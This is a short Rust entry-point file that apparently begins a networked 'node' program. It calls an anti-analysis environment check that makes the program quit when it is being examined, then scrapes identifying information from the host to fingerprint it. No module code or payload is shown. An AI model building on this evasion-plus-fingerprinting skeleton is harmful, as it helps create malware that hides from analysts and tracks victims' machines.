mod anti_analysis;
mod identity;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Ensure proper environment, otherwise die
    anti_analysis::check_environment();

    // Scrape identifying info from the machine, and prepare a unique identifier for the node instance
    let identity = identity::new();

    Ok(())
}
